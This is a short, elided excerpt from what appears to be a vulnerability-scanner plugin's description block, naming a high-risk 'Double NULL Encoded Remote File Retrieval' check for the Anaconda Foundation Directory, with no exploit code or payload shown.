...
if(description)
{
 ...
 name["english"] = "Anaconda Double NULL Encoded Remote File Retrieval";
...
Risk factor : High";
 ...
 summary["english"] = "Anaconda Foundation Directory Double NULL Encoded Remote File Retrieval";
